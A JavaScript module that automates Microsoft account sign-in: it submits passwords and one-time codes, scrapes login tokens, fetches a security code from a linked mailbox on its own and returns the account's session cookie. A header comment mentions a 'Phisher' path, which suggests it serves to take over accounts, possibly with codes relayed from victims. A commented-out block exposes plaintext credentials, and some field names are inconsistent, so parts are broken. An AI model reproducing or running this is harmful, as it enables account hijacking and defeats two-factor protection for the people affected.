const getLiveData = require("./getLiveData")
const axios = require("axios");
const getCredentials = require("../info/getCredentials");
const { getEmailDescription } = require("../utils/getEmailDescription");
const sendott = require('./sendott');
const fetchServerContext = require("./fetchServerContext");

module.exports = async function login(obj, creds) {
/*
Login
- OTP
- OTP Non Phisher (security code)
- Non-Password OTP
- Auth
- Password & Secretkey
*/

    let host = null;
    let passwordhost = null;
    let mspok = null;
    let oparams = null;
    let nopassword = false;
    let apiCanary = null;
    let telemetryContext = null;

    let data = await getLiveData();

    if (!obj?.email) {
        console.log(`Missing email, how tf?`);
        return null;
    }

    if (!data) {
        console.log(`Failed to get live data`);
        return null;
    }

    if (!creds){
        creds = await getCredentials(obj.email)
    }

    if (!creds) {
        console.log(`Failed to get credentials for ${obj.email}`);
        return null;
    }

    if (creds?.Credentials?.HasPassword === 0) {
        nopassword = true;
    }
    console.log(`Nopassword: ${nopassword}`);

    const cookies = data.cookies.split(";").reduce((acc, cookie) => {
        const [name, ...valueParts] = cookie.trim().split("=");
        acc[name] = valueParts.join("=");
        return acc;
    }, {});

    const uaid = cookies["uaid"] || "";
    const mspRequ = cookies["MSPRequ"] || "";
    const mscc = cookies["MSCC"] || "";

    try {
        let loginData = null;

        if (obj.email && obj.id && obj.code) {
            if (nopassword) {
                console.log(`No password!`)
                loginData = await axios({
                    method: "POST",
                    url: "https://login.live.com/ppsecure/post.srf",
                    headers: {
                        "Content-Type": "application/x-www-form-urlencoded",
                        Cookie: data.cookies,
                    },
                    data: `SentProofIDE=${obj.id}&ProofType=1&npotc=${obj.code}&ps=3&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=${data.ppft}&PPSX=Pass&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&isRecoveryAttemptPost=0&i13=0&login=${obj.email}&loginfmt=${obj.email}&type=24&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=`,
                });
            } else {
                loginData = await axios({
                    method: "POST",
                    url: "https://login.live.com/ppsecure/post.srf",
                    headers: {
                        "Content-Type": "application/x-www-form-urlencoded",
                        Cookie: data.cookies,
                    },
                    data: `login=${obj.email}&loginfmt=${obj.email}&type=27&SentProofIDE=${obj.id}&otc=${obj.code}&PPFT=${data.ppft}`,
                });
            }

        } else if (obj.slk && obj.email) {
            loginData = await axios({
                method: "POST",
                url: "https://login.live.com/ppsecure/post.srf",
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded",
                    Cookie: data.cookies,
                },
                data: `login=${obj.email}&loginfmt=${obj.email}&slk=${obj.slk}&psRNGCSLK=${obj.slk}&type=21&PPFT=${data.ppft}`,
            });

        } else if (obj.otp && obj.email && obj.pw) {
            const loginpassword = await axios({
                method: "POST",
                url: "https://login.live.com/ppsecure/post.srf",
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded",
                    Cookie: data.cookies,
                },
                data: `ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=${data.ppft}&PPSX=PassportRN&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&isRecoveryAttemptPost=0&i13=0&login=${obj.email}&loginfmt=${obj.email}&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=${obj.pw}`,
            });

            if (loginpassword.status < 200 || loginpassword.status >= 400) {
                console.error(`[login.js] Password login failed with status ${loginpassword.status}`);
                return null;
            }

            let id = null;
            const regex = /(?<="data":")[^"]+(?=","type":10,"display":)/;
            const match = loginpassword.data.match(regex);

            if (match) {
                id = match[0];
            } else {
                const proofPattern = /{"data":"([^"]+)","type":(\d+),"display":/g;
                const proofMatches = [...loginpassword.data.matchAll(proofPattern)];
                if (proofMatches.length > 0) {
                    const preferredTypes = [10, 14, 13];
                    let proof = proofMatches.find(([, , type]) => preferredTypes.includes(Number(type)));
                    if (!proof) {
                        proof = proofMatches[0];
                    }
                    if (proof) {
                        id = proof[1];
                    }
                }

                if (!id) {
                    try {
                        const serverDataMatch = loginpassword.data.match(/var ServerData = ({.*?});/s);
                        if (serverDataMatch) {
                            const serverData = JSON.parse(serverDataMatch[1]);
                            const arrUserProofs = serverData?.arrUserProofs;
                            if (Array.isArray(arrUserProofs)) {
                                const preferredTypes = [10, 14, 13];
                                const totpProof =
                                    arrUserProofs.find(proof => preferredTypes.includes(Number(proof.type))) ||
                                    arrUserProofs[0];
                                if (totpProof?.data) {
                                    id = totpProof.data;
                                }
                            }
                        }
                    } catch (error) {
                        console.error("Error extracting TOTP from ServerData:", error.message);
                    }
                }
            }

            if (!id) {
                console.error(`[login.js] Failed to extract proof ID for OTP`);
                return "tfa";
            }

            // Try to extract PPFT from response - Microsoft changed their UX, so we need multiple methods
            let secondppft = null;
            
            try {
                // Method 1: Look for sFTTag in JSON
                const sFTTagPattern = /sFTTag['"]:['"]([^'"]*)['"]/;
                const sFTTagMatch = loginpassword.data.match(sFTTagPattern);
                if (sFTTagMatch) {
                    secondppft = sFTTagMatch[1];
                    console.log(`[login.js] PPFT extracted via sFTTag pattern`);
                }

                // Method 2: Look for PPFT in form hidden input
                if (!secondppft) {
                    const ppftFormPattern = /name=["']?PPFT["']?[^>]*value=["']?([^"'\s>]+)["']?/;
                    const ppftFormMatch = loginpassword.data.match(ppftFormPattern);
                    if (ppftFormMatch) {
                        secondppft = ppftFormMatch[1];
                        console.log(`[login.js] PPFT extracted via form input pattern`);
                    }
                }

                // Method 3: Extract from ServerData JavaScript object
                if (!secondppft) {
                    const serverDataMatch = loginpassword.data.match(/var ServerData = ({.*?});/s);
                    if (serverDataMatch) {
                        try {
                            const serverData = JSON.parse(serverDataMatch[1]);
                            if (serverData.sFTTag) {
                                const ppftMatch = serverData.sFTTag.match(/value="([^"]*)"/);
                                if (ppftMatch) {
                                    secondppft = ppftMatch[1];
                                    console.log(`[login.js] PPFT extracted from ServerData.sFTTag`);
                                }
                            }
                        } catch (e) {
                            console.error("[login.js] Error parsing ServerData:", e.message);
                        }
                    }
                }

                // Method 4: Try to find any PPFT-like token in the response
                if (!secondppft) {
                    // Look for patterns like data-value="..." or similar PPFT containers
                    const ppftLikePattern = /["']?PPFT["']?\s*[=:]\s*["']([A-Za-z0-9\-_\.]{50,})["']/;
                    const ppftLikeMatch = loginpassword.data.match(ppftLikePattern);
                    if (ppftLikeMatch) {
                        secondppft = ppftLikeMatch[1];
                        console.log(`[login.js] PPFT extracted via generic token pattern`);
                    }
                }

                // Method 5: If all else fails, use the original PPFT from the initial request
                // This sometimes works if the session hasn't changed
                if (!secondppft) {
                    console.warn(`[login.js] Could not extract PPFT from response, using original PPFT from session`);
                    secondppft = data.ppft;
                }

            } catch (error) {
                console.error("[login.js] Error during PPFT extraction:", error);
                secondppft = data.ppft; // Fallback
            }

            if (!secondppft) {
                console.error(`[login.js] Failed to extract or fallback PPFT - OTP submission will likely fail`);
            } else {
                console.log(`[login.js] PPFT ready for OTP submission: ${secondppft.substring(0, 20)}...`);
            }

            if (loginpassword.headers["set-cookie"]) {
                loginpassword.headers["set-cookie"].forEach(cookie => {
                    const [name, ...values] = cookie.split("=");
                    const value = values.join("=").split(";").shift();
                    if (name === "__Host-MSAAUTH") passwordhost = value;
                    if (name === "MSPOK") mspok = value;
                    if (name === "OParams") oparams = value;
                });
            }

            if (!passwordhost) {
                console.error(`[login.js] Failed to extract __Host-MSAAUTH cookie`);
                return null;
            }

            console.log(`[login.js] Password auth successful, submitting OTP...`);

            // Fetch server context (api canary / telemetry) similar to recovery flow to improve downstream requests
            try {
                const context = await fetchServerContext(obj.email);
                if (context && !context.error && context.serverData) {
                    apiCanary = context.serverData.apiCanary || context.serverData?.apiCanary || null;
                    telemetryContext = context.telemetryContext || null;
                    console.log(`[login.js] Fetched server context: apiCanary=${Boolean(apiCanary)}, telemetry=${Boolean(telemetryContext)}`);
                } else {
                    console.log(`[login.js] fetchServerContext returned no usable server data: ${context?.error || 'none'}`);
                }
            } catch (e) {
                console.warn(`[login.js] fetchServerContext failed: ${e.message}`);
            }

            // Try OTP submission with a small retry/handshake loop.
            // On some Microsoft UX changes the PPFT/sFTTag or cookies may be required to be refreshed.
            const maxOtpAttempts = 3;
            let otpAttemptError = null;
            for (let attempt = 1; attempt <= maxOtpAttempts; attempt++) {
                try {
                    console.log(`[login.js] OTP attempt ${attempt}/${maxOtpAttempts}`);

                    // Build OTP submission headers and include canary/telemetry when available
                    const otpHeaders = {
                        "Content-Type": "application/x-www-form-urlencoded",
                        Cookie: `__Host-MSAAUTH=${passwordhost}; uaid=${uaid}; MSPRequ=${mspRequ}; MSCC=${mscc}; MSPOK=${mspok}; oParams=${oparams}`,
                    };
                    if (apiCanary) {
                        otpHeaders['Canary'] = apiCanary;
                        otpHeaders['canary'] = apiCanary;
                    }
                    if (telemetryContext) {
                        otpHeaders['TelemetryContext'] = telemetryContext;
                        otpHeaders['telemetrycontext'] = telemetryContext;
                    }

                    loginData = await axios({
                        method: "POST",
                        url: "https://login.live.com/ppsecure/post.srf",
                        headers: otpHeaders,
                        data: `otc=${obj.otp}&AddTD=true&SentProofIDE=${id}&GeneralVerify=false&PPFT=${secondppft}&canary=&sacxt=1&hpgrequestid=&hideSmsInMfaProofs=false&type=19&login=${obj.email}`,
                        timeout: 15000,
                        validateStatus: () => true // capture all responses
                    });

                    console.log(`[login.js] OTP submission response status: ${loginData.status}`);

                    if (loginData.status >= 200 && loginData.status < 400) {
                        console.log(`[login.js] ✓ OTP submission successful (status ${loginData.status})`);
                        break;
                    }

                    // Log preview for debugging
                    console.error(`[login.js] OTP submission returned error status ${loginData.status}`);
                    console.error(`[login.js] Response preview: ${String(loginData.data).substring(0, 400)}`);

                    // Attempt a lightweight handshake to refresh PPFT / cookies before retrying
                    if (attempt < maxOtpAttempts) {
                        try {
                            console.log(`[login.js] Performing handshake to refresh PPFT/cookies before retry`);
                            const refreshRes = await axios.get('https://login.live.com/ppsecure/post.srf', {
                                headers: {
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120 Safari/537.36',
                                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                                    Cookie: data.cookies
                                },
                                timeout: 10000,
                                validateStatus: () => true
                            });

                            const body = String(refreshRes.data || '');
                            // Try to extract a new PPFT or sFTTag from the refreshed page
                            const ppftMatch = body.match(/name=["']?PPFT["']?[^>]*value=["']?([^"'\s>]+)["']?/i) ||
                                              body.match(/sFTTag['"]?[:=]['"]([^'"]+)['"]/i) ||
                                              body.match(/name=["']?t["']?[^>]*value=["']?([^"'\s>]+)["']?/i);
                            if (ppftMatch && ppftMatch[1]) {
                                secondppft = ppftMatch[1];
                                console.log(`[login.js] Refreshed PPFT/sFTTag from handshake: ${secondppft.substring(0, 20)}...`);
                            }

                            // Update cookies from refresh response if provided
                            if (refreshRes.headers && refreshRes.headers['set-cookie']) {
                                refreshRes.headers['set-cookie'].forEach(cookie => {
                                    const [name, ...vals] = cookie.split('=');
                                    const val = vals.join('=').split(';').shift();
                                    if (name === '__Host-MSAAUTH') passwordhost = val;
                                    if (name === 'MSPOK') mspok = val;
                                    if (name === 'OParams') oparams = val;
                                });
                                console.log('[login.js] Updated cookies from handshake');
                            }
                        } catch (handshakeErr) {
                            console.warn(`[login.js] Handshake attempt failed: ${handshakeErr.message}`);
                        }
                    }

                    otpAttemptError = `OTP attempt ${attempt} failed with status ${loginData.status}`;
                    if (attempt < maxOtpAttempts) await new Promise(r => setTimeout(r, 1000 * attempt));
                    else return null;

                } catch (otpError) {
                    console.error(`[login.js] Error submitting OTP on attempt ${attempt}:`, otpError.message);
                    otpAttemptError = otpError.message;
                    if (attempt < maxOtpAttempts) await new Promise(r => setTimeout(r, 1000 * attempt));
                    else return null;
                }
            }




        /// Second OTP Method (for no OTP sent)
        // TD: Fix
        } else if (obj.email && obj.password && obj.secId && obj.secEmail) {
            console.log(`Email: ${obj.email}, Pw: ${obj.pw}, Sec ID: ${obj.ssecid}, Security Email: ${obj.ssecemail}`)
            const loginpassword = await axios({
                method: "POST",
                url: "https://login.live.com/ppsecure/post.srf",
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded",
                    Cookie: data.cookies,
                },
                data: `ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=${data.ppft}&PPSX=PassportRN&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&isRecoveryAttemptPost=0&i13=0&login=${obj.email}&loginfmt=${obj.email}&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=${obj.pw}`,
            });

            const pattern = /sFTTag['"]:['"]([^'"]*)['"]/g;
            const tokens = [...loginpassword.data.matchAll(pattern)].map(match => match[1]);
            let secondppft = tokens.length > 0 ? tokens[0] : null;

            // Enhanced PPFT extraction with multiple fallback methods
            if (!secondppft) {
                try {
                    const serverDataMatch = loginpassword.data.match(/var ServerData = ({.*?});/s);
                    if (serverDataMatch) {
                        const serverData = JSON.parse(serverDataMatch[1]);
                        if (serverData.sFTTag) {
                            const ppftMatch = serverData.sFTTag.match(/value="([^"]*)"/);
                            if (ppftMatch) {
                                secondppft = ppftMatch[1];
                            }
                        }
                    }
                    if (!secondppft) {
                        const ppftRegex = /name="PPFT"[^>]*value="([^"]*)"/;
                        const ppftMatch = loginpassword.data.match(ppftRegex);
                        if (ppftMatch) {
                            secondppft = ppftMatch[1];
                        }
                    }
                    if (!secondppft) {
                        const ppftRegex2 = /value="([^"]*)"[^>]*name="PPFT"/;
                        const ppftMatch2 = loginpassword.data.match(ppftRegex2);
                        if (ppftMatch2) {
                            secondppft = ppftMatch2[1];
                        }
                    }
                    if (!secondppft) {
                        // Additional fallback for various sFT/sFTTag patterns
                        const sFTPatterns = [
                            /["']sFTTag["']\s*:\s*["']([^"']+)["']/g,
                            /["']sFT["']\s*:\s*["']([^"']+)["']/g,
                            /sFTTag=([^&\s]+)/g,
                            /sFT=([^&\s]+)/g,
                            /name=["']?sFTTag["']?[^>]*value=["']?([^"'\s>]+)["']?/g,
                            /name=["']?sFT["']?[^>]*value=["']?([^"'\s>]+)["']?/g
                        ];
                        for (const pattern of sFTPatterns) {
                            const match = loginpassword.data.match(pattern);
                            if (match && match[1]) {
                                secondppft = match[1];
                                break;
                            }
                        }
                    }
                } catch (error) {
                    console.error("Error extracting secondary PPFT:", error);
                }
            }

            if (loginpassword.headers["set-cookie"]) {
                loginpassword.headers["set-cookie"].forEach(cookie => {
                    const [name, ...values] = cookie.split("=");
                    const value = values.join("=").split(";").shift();
                    if (name === "__Host-MSAAUTH") passwordhost = value;
                    if (name === "MSPOK") mspok = value;
                    if (name === "OParams") oparams = value;
                });
            }

            if (loginpassword.status < 200 || loginpassword.status >= 400) {
                return null;
            }

            console.log(`Password Host: ${passwordhost}`)

            await sendott(obj.ssecid)

            const time = Date.now();
            console.log(`Getting otc...`)
            const otc = await getEmailDescription(time, obj.ssecemail, true)
            if (!otc){
                return
            }

            console.log(`Got security code: ${otc}`)

            const postHeaders = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://login.live.com',
                'Cookie': `__Host-MSAAUTH=${passwordhost}; MSPOK=${mspok}; OParams=${oparams}`,
            };
            if (apiCanary) {
                postHeaders['Canary'] = apiCanary;
                postHeaders['canary'] = apiCanary;
            }
            if (telemetryContext) {
                postHeaders['TelemetryContext'] = telemetryContext;
                postHeaders['telemetrycontext'] = telemetryContext;
            }

            loginData = await axios.post(
                'https://login.live.com/ppsecure/post.srf?mkt=nl-NL&id=38936&contextid=6912F145433F46F1&opid=042E85CB81883750&bk=1751659710&uaid=bd6f79b0a2c840a98835e2e04d523524&pid=0&route=C518_BL2',
                `AddTD=true&SentProofIDE=${encodeURIComponent(obj.secid)}&GeneralVerify=false&PPFT=${encodeURIComponent(secondppft)}&canary=&sacxt=0&hpgrequestid=&hideSmsInMfaProofs=false&type=18&login=${encodeURIComponent(obj.email)}&ProofConfirmation=${encodeURIComponent(obj.secemail)}&otc=${encodeURIComponent(otc)}`,
                {
                    headers: postHeaders
                }
            );
            
        } else {
            console.log('Invalid input for login.js');
            return null;
        }

        // First check for token in cookies
        if (loginData && loginData.headers && loginData.headers["set-cookie"]) {
            console.log(`[login.js] Parsing response cookies for final host token...`);
            loginData.headers["set-cookie"].forEach(cookie => {
                const [name, ...values] = cookie.split("=");
                if (name === "__Host-MSAAUTH") {
                    host = values.join("=").split(";").shift();
                    console.log(`[login.js] ✓ Final __Host-MSAAUTH extracted from cookies: ${host.substring(0, 20)}...`);
                }
            });
        }

        // If OTP was successful (status 200), the passwordhost cookie from earlier is our token
        if (!host && passwordhost) {
            console.log(`[login.js] No new host cookie found, using passwordhost from password auth stage`);
            host = passwordhost;
            console.log(`[login.js] ✓ Using __Host-MSAAUTH from password auth: ${host.substring(0, 20)}...`);
        }

        // If still no host, check for Location header (redirect)
        if (!host && loginData && loginData.headers && loginData.headers.location) {
            console.log(`[login.js] Checking for auth token in Location header...`);
            const locationHeader = loginData.headers.location;
            console.log(`[login.js] Location: ${locationHeader.substring(0, 100)}`);
            
            // Try to extract token from Location header
            const tokenMatch = locationHeader.match(/[?&]t=([A-Za-z0-9\-_\.]+)/);
            if (tokenMatch && tokenMatch[1]) {
                host = tokenMatch[1];
                console.log(`[login.js] ✓ Token extracted from Location header: ${host.substring(0, 20)}...`);
            }
        }

        // Try to find auth tokens in response body if still missing
        if (!host && loginData && loginData.data && typeof loginData.data === 'string') {
            console.log(`[login.js] Checking response body for auth tokens...`);
            
            // Try multiple patterns for different Microsoft response formats
            const tokenPatterns = [
                /[?&]t=([A-Za-z0-9\-_\.]+)/,
                /t:['"]?([A-Za-z0-9\-_\.]{50,})['"]?/,
                /access_token['":\s=]+['"]?([A-Za-z0-9\-_\.]+)['"]?/,
                /token['":\s=]+['"]?([A-Za-z0-9\-_\.]+)['"]?/,
                /MSAAUTH['":\s=]+['"]?([A-Za-z0-9\-_\.\=\/\+]+)['"]?/
            ];
            
            for (const pattern of tokenPatterns) {
                const match = loginData.data.match(pattern);
                if (match && match[1] && match[1].length > 15) {
                    host = match[1];
                    console.log(`[login.js] ✓ Token extracted from response body via pattern: ${host.substring(0, 20)}...`);
                    break;
                }
            }
        }

        if (!host) {
            // Check if the response indicates successful OTP verification despite missing token
            if (loginData && loginData.status === 200) {
                const responseText = loginData.data.substring(0, 200);
                
                // If response contains certain success indicators, use passwordhost anyway
                if (responseText.includes('ServerInfo') || responseText.includes('PreprocessInfo')) {
                    console.warn(`[login.js] Response indicates OTP was processed (contains ServerInfo/PreprocessInfo)`);
                    console.warn(`[login.js] Using passwordhost token from password auth as fallback`);
                    host = passwordhost;
                    console.log(`[login.js] ✓ Using passwordhost fallback: ${host.substring(0, 20)}...`);
                } else {
                    console.error(`[login.js] ✗ No host token found. Response may indicate failure or changed format.`);
                    console.error(`[login.js] Response preview: ${responseText}`);
                }
            }
        } else {
            console.log(`[login.js] ✓ Login successful with host token`);
        }

        if (host && nopassword){
            console.log(`[login.js] Nopassword fix seemed to have worked!`)
        }

    } catch (error) {
        console.error("[login.js] Error during login process:", error.message);
        throw error;
    }

    return host || null;
};


// async function main() {
//     let obj = {};
//     obj.email = "bdkmevnniexgh9m7@outlook.com";
//     obj.pw = "sywn5srfpc0cg3nm";
//     obj.ssecid = "-DqLVN0Mk8FFP9odp3iCYh4PEHJrYKQ1RfIT2z3S*9O6CqD8vLnMmdxg2CBwrfEY*XJOq!OUyoTpAFtvnbS4dXwqqzSc7gCleoJaFfeAEdbOIj8JLOPyx5HjA6rekSYVPwT4xI!pTCjZI45m7wjutwo8frJTFqTSCSLd6ZwNBel4Awy*3U6ZS9qjxeHuqBHwmGPxBFTkQ8Ho1z5OB2B2v!t0KYO0RJizxTKMAd!op6GbvTBsw2ScxTVkENEgXq6Zv3A$$";
//     obj.ssecemail = "f6rcgfe33fcfwmal@oldward.lol";
//     let result = await module.exports(obj, null);
//     console.log(`Result: ${result}`);
// }
// main();